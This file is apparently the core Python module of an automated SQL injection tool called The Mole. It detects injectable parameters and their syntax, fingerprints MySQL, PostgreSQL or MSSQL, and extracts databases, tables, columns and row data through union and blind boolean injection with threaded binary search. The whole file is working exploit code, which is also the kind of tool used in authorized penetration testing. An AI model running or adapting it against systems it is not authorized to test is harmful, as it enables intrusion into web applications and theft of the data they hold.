#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from domanalyser import DomAnalyser,NeedleNotFound
from dbmsmoles import DbmsMole, MysqlMole, PostgresMole, MssqlMole
from dbdump import DatabaseDump
from threader import Threader
from output import BlindSQLIOutput
import sys, time

class TheMole:
    
    ex_string = 'Operation not supported for this dumper'
    field = '[_SQL_Field_]'
    table = '[_SQL_Table_]'
    
    dbms_mole_list = [MysqlMole, PostgresMole, MssqlMole]
    
    def __init__(self, threads = 4):
        self.initialized = False
        self.needle = None
        self.url = None
        self.requester = None
        self.wildcard = None
        self.mode = 'union'
        self.end = ' '
        self.threader = Threader(threads)
        self.prefix = ''
        self.end = ''
        self.verbose = False
        self.timeout = 0
    
    def restart(self):
        self.initialized = False
    
    def initialize(self):
        self.analyser = DomAnalyser()
        if not self.requester:
            raise MoleAttributeRequired('Attribute requester is required')
        if not self.url:
            raise MoleAttributeRequired('Attribute url is required')
        if not self.wildcard:
            raise MoleAttributeRequired('Attribute wildcard is required')
        if not self.needle:
            raise MoleAttributeRequired('Attribute needle is required')
        self.separator = ''
        self.comment = ''
        self.parenthesis = 0
        self.database_dump = DatabaseDump()
        
        original_request = self.get_requester().request(self.url.replace(self.wildcard, self.prefix))
        try:
            self.analyser.set_good_page(original_request, self.needle)
        except NeedleNotFound:
            print('[-] Could not find needle.')
            return
        
        try:
            self._find_separator()
        except SQLInjectionNotDetected:
            print('[-] Could not detect SQL Injection.')
            return
        if self.mode == 'union':
            req = self.get_requester().request(
                self.generate_url(' own3d by 1')
            )
            self._syntax_error_content = self.analyser.node_content(req)
            
            try:
                self._find_comment_delimiter()
            except SQLInjectionNotExploitable:
                print('[-] Could not exploit SQL Injection.')
                return
            
            self._find_column_number()
            
            try:
                self._find_injectable_field()
            except SQLInjectionNotExploitable:
                print('[-] Could not exploit SQL Injection.')
                return
            
            self._detect_dbms()
        else:
            if not self.separator == ' ':
                self.end = 'and {par}{sep}{sep}like{sep}'.format(sep=self.separator, par=(self.parenthesis * ')'))
            else:
                self.end = ' '
            self._detect_dbms_blind()
        
        self.initialized = True

    def generate_url(self, injection_string):
        url = self.url.replace(
                self.wildcard,
                ('{prefix}{sep}{par}' + injection_string + '{end}{com}').format(
                                        sep=self.separator,
                                        com=self.comment,
                                        par=(self.parenthesis * ')'),
                                        op_par=(self.parenthesis * ')'),
                                        prefix=self.prefix,
                                        end=self.end)
        )
        if self.verbose == True:
            print('[i] Executing query:',url)
        return url
    
    def get_requester(self):
        return self.requester
        
    def set_mode(self, mode):
        if mode == 'blind':
            if self.initialized and self.separator != ' ':
                self.end =  ' and {sep}{sep} like {sep}'.format(sep=self.separator)
            self.comment = ''
            self.parenthesis = 0
        else:
            self.initialized = False
        self.mode = mode
    
    def poll_databases(self):
        if self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        else:
            return None

    def abort_query(self):
        self.stop_query = True

    def _generic_query_item(self, query_generator, offset, result_parser = lambda x: x[0]):
        if self.stop_query:
            return None
        req = self.get_requester().request(self.generate_url(query_generator(offset)))
        result = self._dbms_mole.parse_results(self.analyser.decode(req))
        if not result or len(result) < 1:
            raise QueryError()
        else:
            return result_parser(result)

    def _generic_query(self, count_query, query_generator, result_parser = lambda x: x[0]):
        req = self.get_requester().request(self.generate_url(count_query))
        result = self._dbms_mole.parse_results(self.analyser.decode(req))
        if not result or len(result) != 1:
            raise QueryError('Count query failed.')
        else:
            count = int(result[0])
            if count == 0:
                return []
            dump_result = []
            self.stop_query = False
            dump_result = self.threader.execute(count, lambda i: self._generic_query_item(query_generator, i, result_parser))
            dump_result.sort()
            return dump_result

    def get_databases(self, force_fetch=False):
        if not force_fetch and self.database_dump.db_map:
            return list(self.database_dump.db_map.keys())
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.schema_query(
                    self.query_columns, self.injectable_field, x
                )
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.schema_blind_count_query(x, y), 
                lambda x: lambda y,z: self._dbms_mole.schema_blind_len_query(y, z, offset=x),
                lambda x,y,z: self._dbms_mole.schema_blind_data_query(x, y, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_db(i)
        return data

    def poll_tables(self, db):
        if self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        else:
            return None

    def get_tables(self, db, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
            return list(self.database_dump.db_map[db].keys())
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.table_query(
                    db, self.query_columns, self.injectable_field, x
                ),
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.table_blind_count_query(x, y, db=db), 
                lambda x: lambda y,z: self._dbms_mole.table_blind_len_query(y, z, db=db, offset=x),
                lambda x,y,z: self._dbms_mole.table_blind_data_query(x, y, db=db, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_table(db, i)
        return data

    def poll_columns(self, db, table):
        if self.database_dump.db_map[db][table]:
            return list(self.database_dump.db_map[db][table])
        else:
            return None

    def get_columns(self, db, table, force_fetch=False):
        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
            return list(self.database_dump.db_map[db][table])
        if self.mode == 'union':
            data = self._generic_query(
                self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field), 
                lambda x: self._dbms_mole.columns_query(
                    db, table, self.query_columns, self.injectable_field, x
                )
            )
        else:
            data = self._blind_query(
                lambda x,y: self._dbms_mole.columns_blind_count_query(x, y, db=db, table=table), 
                lambda x: lambda y,z: self._dbms_mole.columns_blind_len_query(y, z, db=db, table=table, offset=x),
                lambda x,y,z: self._dbms_mole.columns_blind_data_query(x, y, db=db, table=table, offset=z),
            )
            data = list(map(lambda x: x[0], data))
        for i in data:
            self.database_dump.add_column(db, table, i)
        return data

    def get_fields(self, db, table, fields, where="1=1"):
        if self.mode == 'union':
            return self._generic_query(
                self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where), 
                lambda x: self._dbms_mole.fields_query(
                    db, table, fields, self.query_columns, self.injectable_field, x, where=where
                ),
                lambda x: x
            )
        else:
            return self._blind_query(
                lambda x,y: self._dbms_mole.fields_blind_count_query(x, y, db=db, table=table, where=where), 
                lambda x: lambda y,z: self._dbms_mole.fields_blind_len_query(y, z, fields=fields, db=db, table=table, offset=x, where=where),
                lambda x,y,z: self._dbms_mole.fields_blind_data_query(x, y, fields=fields, db=db, table=table, offset=z, where=where),
            )

    def get_dbinfo(self):
        if self.mode == 'union':
            req = self.get_requester().request(
                    self.generate_url(
                        self._dbms_mole.dbinfo_query(self.query_columns, self.injectable_field)
                    )
                  )
            data = self._dbms_mole.parse_results(self.analyser.decode(req))
        else:
            data = self._blind_query(
                None,
                lambda x: lambda y,z: self._dbms_mole.dbinfo_blind_len_query(y, z),
                lambda x,y,z: self._dbms_mole.dbinfo_blind_data_query(x, y),
                row_count=1, 
            )
            if len(data) != 1 or len(data[0]) != 3:
                raise QueryError()
            data = [data[0][0], data[0][1], data[0][2]]
        if not data or len(data) != 3:
            raise QueryError()
        else:
            return data

    def _generic_blind_len(self, count_fun, trying_msg, max_msg):
        length = 0
        last = 1
        while True and not self.stop_query:
            req = self.get_requester().request(
                self.generate_url(
                    count_fun('>', last)
                )
            )
            sys.stdout.write(trying_msg(last))
            sys.stdout.flush()
            if self.needle in self.analyser.decode(req):
                break;
            last *= 2
        sys.stdout.write(max_msg(str(last)))
        sys.stdout.flush()
        pri = last // 2
        while pri < last:
            if self.stop_query:
                return pri
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            req = self.get_requester().request(
                self.generate_url(
                    count_fun('<', medio - 1)
                )
            )
            if self.needle in self.analyser.decode(req):
                pri = medio
            else:
                last = medio - 1
        return pri
    
    # Finds a character in the tuple result
    def _blind_query_character(self, query_fun, index, offset, output=None):
        pri   = ord(' ')
        last  = 126
        index = index + 1
        while True:
            if self.stop_query:
                return None
            medio = (pri + last)//2
            response = self.analyser.decode(
                self.requester.request(
                    self.generate_url(query_fun(index, medio, offset))
                )
            )
            if self.needle in response:
                pri = medio+1
            else:
                last = medio
            if medio == last - 1:
                output.set(chr(medio+1), index - 1)
                return chr(medio+1)
            else:
                if pri == last:                
                    output.set(chr(medio), index - 1)
                    return chr(medio)   
                else:
                    output.set(chr(medio), index - 1)
    
    def _blind_query(self, count_fun, length_fun, query_fun, offset=0, row_count=None):
        self.stop_query = False
        if count_fun is None:
            count = row_count
        else:
            count = self._generic_blind_len(
                count_fun, 
                lambda x: '\rTrying count: ' + str(x),
                lambda x: '\rAt most count: ' + str(x)
            )
            print('\r[+] Found row count:', count)
        results = []
        for row in range(offset, count):
            if self.stop_query:
                return results
            length = self._generic_blind_len(
                length_fun(row),
                lambda x: '\rTrying length: ' + str(x),
                lambda x: '\rAt most length: ' + str(x)
            )
            print('\r[+] Guessed length:', length)
            output=''
            sqli_output = BlindSQLIOutput(length)
            if self.stop_query:
                return results
            output = ''.join(self.threader.execute(length, lambda i: self._blind_query_character(query_fun, i, row, sqli_output)))
            sqli_output.finish()
            results.append(output.split(self._dbms_mole.blind_field_delimiter()))
        return results

    
    def _find_separator(self):
        separator_list = ['\'', '"', ' ']
        equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
        separator = None
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            self.parenthesis = parenthesis
            for sep in separator_list:
                print('[i] Trying separator: "' + sep + '"')
                self.separator = sep
                req = self.get_requester().request(
                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1')
                )
                if self.analyser.is_valid(req):
                    separator = sep
                    break
            if separator:
                # Validate the negation of the query
                req = self.get_requester().request(
                    self.generate_url(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0')
                )
                if not self.analyser.is_valid(req):
                    print('[+] Found separator: "' + self.separator + '"')
                    return
        if not separator:
            raise SQLInjectionNotDetected()
    
    def _find_comment_delimiter(self):
        #Find the correct comment delimiter
        
        comment_list = ['#', '--', '/*', ' ']
        comment = None
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            self.parenthesis = parenthesis
            for com in comment_list:
                print('[i] Trying injection using comment:',com)
                self.comment = com
                req = self.get_requester().request(
                    self.generate_url(' order by 1')
                )
                if self.analyser.node_content(req) != self._syntax_error_content:
                    comment = com
                    break
            if not comment is None:
                break
        if comment is None:
            self.parenthesis = 0
            raise SQLInjectionNotExploitable()
        
        print("[+] Found comment delimiter:", self.comment)
    
    def _find_column_number(self):
        #Find the number of columns of the query
        #First get the content of needle in a wrong situation
        req = self.get_requester().request(
            self.generate_url(' order by 15000')
        )
        content_of_needle = self.analyser.node_content(req)
        
        last = 2
        done = False
        new_needle_content = self.analyser.node_content(
            self.get_requester().request(
                self.generate_url(' order by %d ' % (last,))
            )
        )
        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
            last *= 2
            sys.stdout.write('\r[i] Trying length: ' + str(last) + '     ')
            sys.stdout.flush()
            new_needle_content = self.analyser.node_content(
                self.get_requester().request(
                    self.generate_url(' order by %d ' % (last,))
                )
            )
        pri = last // 2
        sys.stdout.write('\r[i] Maximum length: ' + str(last) + '     ')
        sys.stdout.flush()
        while pri < last:
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            sys.stdout.write('\r[i] Trying length: ' + str(medio) + '    ')
            sys.stdout.flush()
            new_needle_content = self.analyser.node_content(
                self.get_requester().request(
                    self.generate_url(' order by %d ' % (medio,))
                )
            )
            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
                pri = medio
            else:
                last = medio - 1
        self.query_columns = pri
        print("\r[+] Found number of columns:", self.query_columns)
    
    def _find_injectable_field(self):
        used_hashes = set()
        base = 714
        for mole in TheMole.dbms_mole_list:
            fingers = mole.injectable_field_fingers(self.query_columns, base)
            for i in fingers:
                hashes, to_search_hashes = i
                hash_string = ",".join(hashes)
                if not hash_string in used_hashes:
                    req = self.analyser.decode(self.get_requester().request(
                            self.generate_url(
                                " and 1=0 union all select " + hash_string
                            )
                          ))
                    try:
                        self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
                        if len(self.injectable_fields) > 0:
                            print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
                            if self._filter_injectable_fields(mole):
                                return
                    except Exception as ex:
                        print(ex)
                        used_hashes.add(hash_string)                
        raise SQLInjectionNotExploitable()

    def _filter_injectable_fields(self, dbms_mole_class):
        for field in self.injectable_fields:
            print('[i] Trying field', field + 1)
            query = dbms_mole_class.field_finger_query(self.query_columns, field)
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            if dbms_mole_class.field_finger() in self.analyser.decode(req):
                self.injectable_field = field
                print('[+] Found injectable field:', field + 1)
                return True
        return False

    def _detect_dbms(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            query = dbms_mole_class.dbms_check_query(self.query_columns, self.injectable_field)
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            parsed = dbms_mole_class().parse_results(self.analyser.decode(req))
            if parsed and len(parsed) > 0:
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')

    def _detect_dbms_blind(self):
        for dbms_mole_class in TheMole.dbms_mole_list:
            query = dbms_mole_class.dbms_check_blind_query()
            url_query = self.generate_url(query)
            req = self.get_requester().request(url_query)
            if self.analyser.is_valid(req):
                self._dbms_mole = dbms_mole_class()
                print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                return
        raise Exception('[-] Could not detect DBMS')



class SQLInjectionNotDetected(Exception):
    pass

class SQLInjectionNotExploitable(Exception):
    pass

class QueryError(Exception):
    pass
    
class MoleAttributeRequired(Exception):
    def __init__(self, msg):
        self.message = msg
